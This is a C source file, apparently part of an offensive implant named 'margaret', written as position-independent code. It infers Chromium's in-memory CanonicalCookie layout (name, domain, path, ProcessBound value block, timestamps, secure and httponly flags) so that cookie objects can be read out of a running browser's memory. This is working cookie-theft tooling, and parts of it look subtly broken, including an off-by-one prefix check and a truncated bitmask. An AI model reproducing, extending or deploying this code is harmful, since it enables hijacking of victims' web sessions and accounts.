#define CODE_SECTION_NAME ".text$H"
#include "margaret.h"
#include "cc_layout.h"

/* Runtime CanonicalCookie layout calibration */

/* Byte readers. */

CODE_SECTION DWORD CcReadU32(const BYTE *data)
{
    return (DWORD)((DWORD)data[0] |
                     ((DWORD)data[1] << 8u) |
                     ((DWORD)data[2] << 16u) |
                     ((DWORD)data[3] << 24u));
}

CODE_SECTION ULONGLONG CcReadU64(const BYTE *data)
{
    return (ULONGLONG)CcReadU32(data) |
           ((ULONGLONG)CcReadU32(data + 4) << 32u);
}

/* x64 libc++ string reader. */

/* Read a 24-byte libc++ string in short or long form. */
CODE_SECTION BOOL CcReadString(const BYTE *string,
                                                  CC_STRING_VIEW *view)
{
    BYTE sizeByte;
    ULONGLONG pointer;

    if (string == NULL || view == NULL) {
        return FALSE;
    }

    sizeByte = string[23];
    if ((sizeByte & 0x80u) == 0u) {
        /* Short: inline data, length in byte 23. */
        view->Data = string;
        view->Length = (DWORD)(sizeByte & 0x7Fu);
        return TRUE;
    }

    /* Long: pointer at +0, length at +8. */
    pointer = CcReadU64(string);
    view->Length = (DWORD)CcReadU64(string + 8);
    if (pointer == 0 || view->Length == 0u || view->Length > 4096u) {
        view->Data = NULL;
        view->Length = 0u;
        return FALSE;
    }
    view->Data = (const BYTE *)pointer;
    return TRUE;
}


/* Require an aligned, canonical user-space pointer. */
CODE_SECTION BOOL CcPtrPlausible(ULONG_PTR p)
{
    DWORD hi;
    /* Reject addresses at or above 128 TiB without a 64-bit immediate. */
    if (p < 0x10000u || (p & 7u) != 0u) {
        return FALSE;
    }
    hi = (DWORD)(p >> 32u);
    return (hi >> 16u) == 0u;
}


/* Require committed, readable, non-guarded memory before dereference. */
CODE_SECTION BOOL CcRegionOk(PCVOID p,
                                             MEMORY_BASIC_INFORMATION *mbi,
                                             PVIRTUAL_QUERY_FN vq)
{
    DWORD state;
    DWORD prot;
    if (vq(p, mbi, sizeof(*mbi)) == 0u) {
        return FALSE;
    }
    state = CcReadU32((const BYTE *)mbi + MBI_OFF_STATE);
    prot = CcReadU32((const BYTE *)mbi + MBI_OFF_PROTECT);
    return state == MEM_COMMIT && (prot & 0xEEu) != 0u &&
           (prot & PAGE_GUARD) == 0u;
}


/*
 * Infer offsets from quorum-backed invariants: 24-byte libc++ strings;
 * consecutive name/domain/path fields; a ProcessBound value block; plausible
 * timestamps; and bounded enums. Any ambiguity fails closed.
 */
#define CAL_STR_SCAN_LO   0x08u
#define CAL_STR_SCAN_HI   0xF8u
#define CAL_STR_MAX       8u
#define CAL_TIME_MAX      16u
/* Plausible Chromium time high-word range, avoiding 64-bit immediates. */
#define CAL_TIME_HI_MIN   2900000u
#define CAL_TIME_HI_MAX   3700000u

static CODE_SECTION BYTE CcCalPrintable(BYTE b)
{
    return (BYTE)((b >= 0x20u && b <= 0x7Eu) ||
                    b == 0x09u || b == 0x0Au || b == 0x0Du);
}

/* Validate one non-empty libc++ string. */
static CODE_SECTION BOOL CcCalStringAt(
    const BYTE *cookie, DWORD o, PVIRTUAL_QUERY_FN vq,
    MEMORY_BASIC_INFORMATION *mbi, CC_STRING_VIEW *view)
{
    BYTE sizeByte = cookie[o + 23u];
    DWORD i;

    if (!CcReadString(cookie + o, view)) {
        return FALSE;
    }
    if ((sizeByte & 0x80u) == 0u) {
        /* Short form: non-empty printable inline data. */
        if (view->Length == 0u || view->Length > 22u) {
            return FALSE;
        }
        for (i = 0u; i < view->Length; ++i) {
            if (!CcCalPrintable(view->Data[i])) {
                return FALSE;
            }
        }
        return TRUE;
    }
    /* Long form: vetted heap data of at least 23 bytes. */
    if (view->Length < 23u) {
        return FALSE;
    }
    if (!CcPtrPlausible((ULONG_PTR)view->Data)) {
        return FALSE;
    }
    return CcRegionOk((PCVOID)view->Data, mbi, vq);
}

/* Count path or domain predicate matches at one offset. */
#define CAL_ROLE_PATH    0u
#define CAL_ROLE_DOMAIN  1u

static CODE_SECTION DWORD CcCalRoleCount(
    const BYTE *const *sample, DWORD n, DWORD o,
    PVIRTUAL_QUERY_FN vq, MEMORY_BASIC_INFORMATION *mbi, DWORD role)
{
    CC_STRING_VIEW view;
    DWORD cnt = 0u;
    DWORD i;
    for (i = 0u; i < n; ++i) {
        if (CcCalStringAt(sample[i], o, vq, mbi, &view)) {
            if (role == CAL_ROLE_PATH) {
                if (view.Length != 0u && view.Data[0u] == (BYTE)'/') {
                    cnt++;
                }
            } else {
                DWORD b;
                for (b = 0u; b < view.Length; ++b) {
                    if (view.Data[b] == (BYTE)'.') {
                        cnt++;
                        break;
                    }
                }
            }
        }
    }
    return cnt;
}

/* Detect non-printable data in the first 64 bytes. */
static CODE_SECTION BYTE CcCalNonprint(const CC_STRING_VIEW *v)
{
    DWORD n = v->Length;
    DWORD i;
    if (n > 64u) {
        n = 64u;
    }
    for (i = 0u; i < n; ++i) {
        if (!CcCalPrintable(v->Data[i])) {
            return 1u;
        }
    }
    return 0u;
}

/* Plausible Chromium timestamp. */
static CODE_SECTION BYTE CcCalTimelike(ULONGLONG v)
{
    DWORD hi = (DWORD)(v >> 32u);
    return (BYTE)(v != 0u &&
                    hi >= CAL_TIME_HI_MIN && hi <= CAL_TIME_HI_MAX);
}

/* Expiry candidate: plausible time or session-cookie zero. */
static CODE_SECTION BYTE CcCalTimeOrZero(ULONGLONG v)
{
    return (BYTE)(v == 0u || CcCalTimelike(v) != 0u);
}

/* Report the failing calibration step. */
#define CAL_FAIL(step) \
    do { \
        if (diag != NULL) { *diag = (step); } \
        return FALSE; \
    } while (0)

CODE_SECTION BOOL MargaretCcCalibrate(
    const BYTE *const *sample, DWORD n, PVIRTUAL_QUERY_FN vq,
    CC_LAYOUT *lay, PDWORD diag)
{
    MEMORY_BASIC_INFORMATION mbi;
    CC_STRING_VIEW view;
    DWORD strOffs[CAL_STR_MAX];
    DWORD nstr = 0u;
    DWORD tOffs[CAL_TIME_MAX];
    DWORD nt = 0u;
    BYTE nonprint[CAL_SAMPLE_MAX];
    DWORD offName, offDomain, offPath, offValue, offFlag;
    DWORD offCreation, offExpiry, offSame, offPort;
    DWORD o, i, j, j2, k, cnt;
    DWORD quorum; /* Strict sample majority. */

    if (sample == NULL || lay == NULL || n < CAL_SAMPLE_MIN ||
        n > CAL_SAMPLE_MAX) {
        return FALSE;
    }
    quorum = n / 2u;

    /* 1) String offsets valid in a quorum; empty strings are ignored. */
    for (o = CAL_STR_SCAN_LO; o < CAL_STR_SCAN_HI; o += 8u) {
        cnt = 0u;
        for (i = 0u; i < n; ++i) {
            if (CcCalStringAt(sample[i], o, vq, &mbi, &view)) {
                cnt++;
            }
        }
        if (cnt > quorum) {
            if (nstr == CAL_STR_MAX) {
                CAL_FAIL(1u);
            }
            strOffs[nstr] = o;
            nstr++;
        }
    }
    if (nstr < 3u) {
        CAL_FAIL(1u);
    }

    /* 2–3) Locate path and domain by content predicates. */
    offPath = 0u;
    offDomain = 0u;
    {
        DWORD kPath = 0u;
        DWORD kDom = 0u;
        for (j = 0u; j < nstr; ++j) {
            o = strOffs[j];
            if (CcCalRoleCount(sample, n, o, vq, &mbi,
                                        CAL_ROLE_PATH) > quorum) {
                kPath++;
                offPath = o;
            } else if (o != offPath &&
                       CcCalRoleCount(sample, n, o, vq, &mbi,
                                               CAL_ROLE_DOMAIN) > quorum) {
                kDom++;
                offDomain = o;
            }
        }
        if (kPath != 1u) {
            CAL_FAIL(2u);
        }
        if (kDom != 1u) {
            CAL_FAIL(3u);
        }
    }

    /* 4) Validate consecutive name, domain, and path fields. */
    offName = offDomain - 0x18u;
    if (offPath != offDomain + 0x18u || offName < CAL_STR_SCAN_LO) {
        CAL_FAIL(4u);
    }
    {
        BYTE member = 0u;
        for (j = 0u; j < nstr; ++j) {
            if (strOffs[j] == offName) {
                member = 1u;
            }
        }
        if (member == 0u) {
            CAL_FAIL(4u);
        }
    }

    /* 5) Locate the ProcessBound value block by pointer, length, and data. */
    offValue = 0u;
    k = 0u;
    /* Supported layouts place the value below 0x128; otherwise fail closed. */
    for (o = offPath + 0x18u; o < 0x128u; o += 8u) {
        BYTE anyCt = 0u;
        cnt = 0u;
        for (i = 0u; i < n; ++i) {
            ULONGLONG ptr = CcReadU64(sample[i] + o);
            ULONGLONG len = CcReadU64(sample[i] + o + 8u);
            if (CcPtrPlausible((ULONG_PTR)ptr) &&
                len >= 1u && len <= 4096u &&
                CcRegionOk((PCVOID)(ULONG_PTR)ptr, &mbi, vq)) {
                cnt++;
                if (anyCt == 0u) {
                    CC_STRING_VIEW pv;
                    pv.Data = (const BYTE *)(ULONG_PTR)ptr;
                    pv.Length = (DWORD)len;
                    if (CcCalNonprint(&pv) != 0u) {
                        anyCt = 1u;
                    }
                }
            }
        }
        if (cnt > quorum && anyCt != 0u) {
            k++;
            offValue = o;
        }
    }
    if (k != 1u) {
        CAL_FAIL(5u);
    }
    for (i = 0u; i < n; ++i) {
        ULONGLONG ptr = CcReadU64(sample[i] + offValue);
        ULONGLONG len = CcReadU64(sample[i] + offValue + 8u);
        CC_STRING_VIEW pv;
        pv.Data = (const BYTE *)(ULONG_PTR)ptr;
        pv.Length = (DWORD)len;
        nonprint[i] = (CcPtrPlausible((ULONG_PTR)ptr) &&
                       len >= 1u && len <= 4096u &&
                       CcCalNonprint(&pv) != 0u) ? 1u : 0u;
    }

    /* 6) Validate the ProcessBound flag at value + 0x28. */
    offFlag = offValue + 0x28u;
    cnt = 0u;
    for (i = 0u; i < n; ++i) {
        if (sample[i][offFlag] == nonprint[i]) {
            cnt++;
        }
    }
    if (cnt <= quorum) {
        CAL_FAIL(6u);
    }

    /* 7) Collect plausible timestamp fields. */
    for (o = offPath + 0x18u; o < offValue; o += 8u) {
        cnt = 0u;
        for (i = 0u; i < n; ++i) {
            if (CcCalTimelike(CcReadU64(sample[i] + o)) != 0u) {
                cnt++;
            }
        }
        if (cnt > quorum) {
            if (nt == CAL_TIME_MAX) {
                CAL_FAIL(7u);
            }
            tOffs[nt] = o;
            nt++;
        }
    }
    if (nt < 1u) {
        CAL_FAIL(7u);
    }

    /* 8) Prefer mixed session/persistent expiry evidence. */
    offExpiry = 0u;
    k = 0u;
    for (o = offPath + 0x18u; o < offValue; o += 8u) {
        BYTE allz = 1u;
        BYTE any0 = 0u;
        BYTE anynz = 0u;
        if (nt != 0u && o == tOffs[0]) {
            continue; /* Skip creation. */
        }
        for (i = 0u; i < n && allz != 0u; ++i) {
            ULONGLONG v = CcReadU64(sample[i] + o);
            if (CcCalTimeOrZero(v) == 0u) {
                allz = 0u;
            } else if (v == 0u) {
                any0 = 1u;
            } else {
                anynz = 1u;
            }
        }
        if (allz != 0u && any0 != 0u && anynz != 0u) {
            k++;
            offExpiry = o;
        }
    }
    if (k > 1u) {
        CAL_FAIL(8u);
    }
    if (k == 0u && nt >= 2u) {
        /* Otherwise choose a timestamp after creation; zero is acceptable. */
        for (j = 0u; j < nt; ++j) {
            o = tOffs[j];
            cnt = 0u;
            for (i = 0u; i < n; ++i) {
                BYTE ahead = 1u;
                for (j2 = 0u; j2 < nt && ahead != 0u; ++j2) {
                    if (tOffs[j2] != o &&
                        CcReadU64(sample[i] + tOffs[j2]) >=
                            CcReadU64(sample[i] + o)) {
                        ahead = 0u;
                    }
                }
                if (ahead != 0u) {
                    cnt++;
                }
            }
            if (cnt > quorum && (offExpiry == 0u || o > offExpiry)) {
                offExpiry = o;
            }
        }
    }

    /* 9) Creation is the lowest timestamp field holding sample minima. */
    offCreation = 0u;
    for (j = 0u; j < nt; ++j) {
        cnt = 0u;
        o = tOffs[j];
        if (o == offExpiry) {
            continue;
        }
        for (i = 0u; i < n; ++i) {
            BYTE ismin = 1u;
            for (j2 = 0u; j2 < nt && ismin != 0u; ++j2) {
                if (j2 != j &&
                    CcReadU64(sample[i] + tOffs[j2]) <
                        CcReadU64(sample[i] + o)) {
                    ismin = 0u;
                }
            }
            if (ismin != 0u) {
                cnt++;
            }
        }
        if (cnt > quorum && (offCreation == 0u || o < offCreation)) {
            offCreation = o;
        }
    }
    if (offCreation == 0u || offCreation == offExpiry) {
        CAL_FAIL(9u);
    }

    /* 10) Accept bounded same-site and port fields, else zero. */
    offSame = 0u;
    offPort = 0u;
    if (offValue >= 8u) {
        cnt = 0u;
        for (i = 0u; i < n; ++i) {
            if (CcReadU32(sample[i] + offValue - 8u) <= 3u &&
                CcReadU32(sample[i] + offValue - 4u) <= 0xFFFFu) {
                cnt++;
            }
        }
        if (cnt > quorum) {
            offSame = offValue - 8u;
            offPort = offValue - 4u;
        }
    }

    lay->OffName = offName;
    lay->OffDomain = offDomain;
    lay->OffPath = offPath;
    lay->OffValue = offValue;
    lay->OffFlag = offFlag;
    lay->OffCreation = offCreation;
    lay->OffExpiry = offExpiry;
    lay->OffSameSite = offSame;
    lay->OffPort = offPort;
    lay->Calibrated = 1u;
    return TRUE;
}

/*
 * Calibrate adjacent secure_/httponly_ flags from RFC 6265bis prefixes.
 * Ambiguity leaves both flags clear.
 */
#define FLAGS_SCAN_WIDTH  0x20u   /* Candidate offsets. */

CODE_SECTION void MargaretCcFlagsUpdate(
    FLAGS_CAL *cal, const BYTE *cookie, const BYTE *name,
    DWORD nameLen)
{
    DWORD i;

    if (cal == NULL || cookie == NULL || cal->Calibrated != 0u ||
        cal->WindowBase == 0u) {
        return;
    }

    /* __Secure- and __Host- require secure_=true. */
    {
        BYTE isSecure = 0u;
        if (nameLen >= 8u && name[0u] == (BYTE)'_' &&
            name[1u] == (BYTE)'_' && name[2u] == (BYTE)'S' &&
            name[3u] == (BYTE)'e' && name[4u] == (BYTE)'c' &&
            name[5u] == (BYTE)'u' && name[6u] == (BYTE)'r' &&
            name[7u] == (BYTE)'e' && name[8u] == (BYTE)'-') {
            isSecure = 1u;
        } else if (nameLen >= 7u && name[0u] == (BYTE)'_' &&
                   name[1u] == (BYTE)'_' && name[2u] == (BYTE)'H' &&
                   name[3u] == (BYTE)'o' && name[4u] == (BYTE)'s' &&
                   name[5u] == (BYTE)'t' && name[6u] == (BYTE)'-') {
            isSecure = 1u;
        }

        for (i = 0u; i < FLAGS_SCAN_WIDTH; i++) {
            BYTE bit = 1u << i;
            if ((cal->Candidates & bit) == 0u) {
                continue;
            }
            {
                BYTE b = cookie[cal->WindowBase + i];
                if (isSecure && b == 0u) {
                    cal->Candidates &= (DWORD)~bit;
                } else if (!isSecure && b != 0u) {
                    /* Ignore underscore-prefixed names as negative evidence. */
                    if (nameLen == 0u || name[0u] != (BYTE)'_') {
                        cal->Candidates &= (DWORD)~bit;
                    }
                }
            }
        }

        if (cal->Candidates != 0u &&
            (cal->Candidates & (cal->Candidates - 1u)) == 0u) {
            for (i = 0u; i < FLAGS_SCAN_WIDTH; i++) {
                if (cal->Candidates & (1u << i)) {
                    cal->SecureOff =
                        (BYTE)(cal->WindowBase + i);
                    cal->Calibrated = 1u;
                    return;
                }
            }
        }
        if (cal->Candidates == 0u) {
            cal->Calibrated = 2u; /* Contradictory evidence. */
        }
    }
}

CODE_SECTION DWORD MargaretCcFlagsRead(
    const FLAGS_CAL *cal, const BYTE *cookie)
{
    if (cal == NULL || cookie == NULL || cal->Calibrated != 1u) {
        return 0u; /* Fail closed. */
    }
    /* bit 0: secure_; bit 1: httponly_. */
    {
        BYTE secure = cookie[cal->SecureOff];
        BYTE httponly = cookie[cal->SecureOff + 1u];
        return (DWORD)(secure & 1u) | ((DWORD)(httponly & 1u) << 1u);
    }
}

